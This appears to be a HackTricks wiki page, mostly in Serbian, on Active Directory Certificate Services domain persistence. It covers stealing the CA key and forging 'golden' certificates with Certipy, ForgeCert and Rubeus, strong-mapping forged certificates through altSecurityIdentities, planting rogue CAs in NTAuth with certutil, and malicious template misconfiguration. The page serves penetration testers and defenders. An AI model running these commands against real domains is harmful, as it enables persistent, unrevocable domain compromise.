# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je sažetak tehnika domain persistence podeljenih u [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Proverite taj izvor za dodatne detalje.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

Može se utvrditi da je sertifikat CA sertifikat ako su ispunjeni sledeći uslovi:

- Sertifikat je smešten na CA serveru, a njegov privatni ključ zaštićen DPAPI-jem mašine, ili hardverom poput TPM/HSM ako operativni sistem to podržava.
- Polja Issuer i Subject sertifikata se poklapaju sa distinguished name-om CA.
- Ekstenzija "CA Version" prisutna je isključivo u CA sertifikatima.
- Sertifikat nema polja Extended Key Usage (EKU).

Za ekstrakciju privatnog ključa ovog sertifikata, podržani metod preko ugrađenog GUI-ja na CA serveru je alat `certsrv.msc`. Ipak, ovaj sertifikat se ne razlikuje od ostalih koji su pohranjeni u sistemu; stoga se za ekstrakciju mogu primeniti metode kao što je [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Sertifikat i privatni ključ se mogu dobiti i pomoću Certipy naredbom:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Nakon sticanja CA sertifikata i njegovog privatnog ključa u `.pfx` formatu, alati poput [ForgeCert](https://github.com/GhostPack/ForgeCert) mogu se koristiti za generisanje važećih sertifikata:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Korisnik koji je meta falsifikovanja sertifikata mora biti aktivan i sposoban da se autentifikuje u Active Directory-ju da bi proces uspeo. Falsifikovanje sertifikata za posebne naloge kao što je krbtgt je neefikasno.

Ovaj falsifikovani sertifikat će biti **važeći** do navedenog datuma isteka i dok je **root CA sertifikat važeći** (obično od 5 do **10+ godina**). Takođe važi za **mašine**, pa u kombinaciji sa **S4U2Self**, napadač može **održavati persistenciju na bilo kojoj mašini domena** sve dok je CA sertifikat važeći.\ Štaviše, **sertifikati generisani** ovom metodom **ne mogu biti opozvani** jer CA nije svestan njihovog postojanja.

### Rad pod Strong Certificate Mapping Enforcement (2025+)

Od 11. februara 2025. (nakon roll-out-a KB5014754), domain controlleri podrazumevano koriste **Full Enforcement** za mapiranja sertifikata. U praksi ovo znači da vaši falsifikovani sertifikati moraju ili:

- Sadržati snažnu vezu sa ciljnim nalogom (na primer, SID sigurnosno proširenje), ili
- Biti upareni sa jakom, eksplicitnom mapom na `altSecurityIdentities` atributu ciljnog objekta.

Pouzdan pristup za persistenciju je da se izradi falsifikovani sertifikat koji je lančano povezan sa ukradenim Enterprise CA i zatim doda snažna eksplicitna mapa na principal žrtve:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Napomene
- Ako možete napraviti forged certificates koji uključuju SID security extension, oni će se mapirati implicitno čak i pod Full Enforcement. U suprotnom, preferirajte eksplicitne snažne mapiranja. Pogledajte
[account-persistence](account-persistence.md) za više o eksplicitnim mapiranjima.
- Revocation ovde ne pomaže braniteljima: forged certificates nisu poznati CA bazi podataka i stoga ne mogu biti opozvani.

## Poveravanje zlonamernim CA sertifikatima - DPERSIST2

Objekat `NTAuthCertificates` je definisan da sadrži jedan ili više **CA certificates** u svom `cacertificate` atributu, koje koristi Active Directory (AD). Proces verifikacije od strane **domain controller** uključuje proveru objekta `NTAuthCertificates` radi pronalaska unosa koji se poklapa sa **CA** navedenom u polju Issuer autentifikacione **certificate**. Autentifikacija se nastavlja ako se pronađe podudaranje.

Self-signed CA certificate može biti dodat u objekat `NTAuthCertificates` od strane napadača, pod uslovom da on ima kontrolu nad ovim AD objektom. Obično samo članovi grupe **Enterprise Admin**, zajedno sa **Domain Admins** ili **Administrators** u **forest root’s domain**, imaju dozvolu da izmene ovaj objekat. Oni mogu izmeniti objekat `NTAuthCertificates` koristeći `certutil.exe` komandom `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ili koristeći [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatne korisne komande za ovu tehniku:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ova mogućnost je posebno relevantna kada se koristi zajedno sa prethodno opisanim metodom koja uključuje ForgeCert za dinamičko generisanje sertifikata.

> Post-2025 razmatranja mapiranja: postavljanje rogue CA u NTAuth uspostavlja samo poverenje u izdavaoca CA. Da bi se koristili leaf sertifikati za logon kada su DCs u **Full Enforcement**, leaf mora ili da sadrži SID security extension ili mora postojati jaka eksplicitna mapa na ciljnom objektu (na primer, Issuer+Serial u `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Mogućnosti za **persistence** kroz **security descriptor modifications of AD CS** komponenti su brojne. Modifikacije opisane u sekciji "[Domain Escalation](domain-escalation.md)" mogu biti zlonamerno izvedene od strane napadača sa povišenim pristupom. To uključuje dodavanje "control rights" (npr. WriteOwner/WriteDACL/itd.) osetljivim komponentama kao što su:

- **AD computer** objekat CA servera
- **RPC/DCOM server** CA servera
- Bilo koji **descendant AD object or container** u **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na primer, Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, itd.)
- **AD groups delegated rights to control AD CS** po podrazumevanoj postavci ili od strane organizacije (kao što je ugrađena Cert Publishers grupa i bilo koji od njenih članova)

Primer zlonamerne implementacije bi uključivao napadača, koji ima **elevated permissions** u domenu, koji dodaje dozvolu **`WriteOwner`** podrazumevanoj šabloni sertifikata **`User`**, pri čemu je napadač principal za to pravo. Da bi ovo iskoristio, napadač bi prvo promenio vlasništvo šablona **`User`** na sebe. Zatim bi **`mspki-certificate-name-flag`** bio postavljen na **1** u šablonu da omogući **`ENROLLEE_SUPPLIES_SUBJECT`**, što dozvoljava korisniku da navede Subject Alternative Name u zahtevu. Nakon toga, napadač bi mogao da se **enroll** koristeći taj **template**, birajući ime **domain administrator** kao alternativno ime, i da iskoristi pribavljeni sertifikat za autentifikaciju kao DA.

Praktične opcije koje napadači mogu podesiti za dugoročni domain persistence (see {{#ref}}domain-escalation.md{{#endref}} for full details and detection):

- CA policy flags koje dozvoljavaju SAN od requesters (npr. omogućavanje `EDITF_ATTRIBUTESUBJECTALTNAME2`). Ovo održava ESC1-like puteve eksploatabilnim.
- Template DACL ili podešavanja koja omogućavaju authentication-capable issuance (npr. dodavanje Client Authentication EKU, omogućavanje `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolisanje `NTAuthCertificates` objekta ili CA containera da kontinuirano ponovo uvode zlonamerne izdavaoce ako branitelji pokušaju čišćenje.

> [!TIP]
> U ojačanim okruženjima nakon KB5014754, kombinovanje ovih pogrešnih konfiguracija sa eksplicitnim strong mappings (`altSecurityIdentities`) osigurava da izdate ili lažne sertifikate ostanu upotrebljivi čak i kada DCs primenjuju strong mapping.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
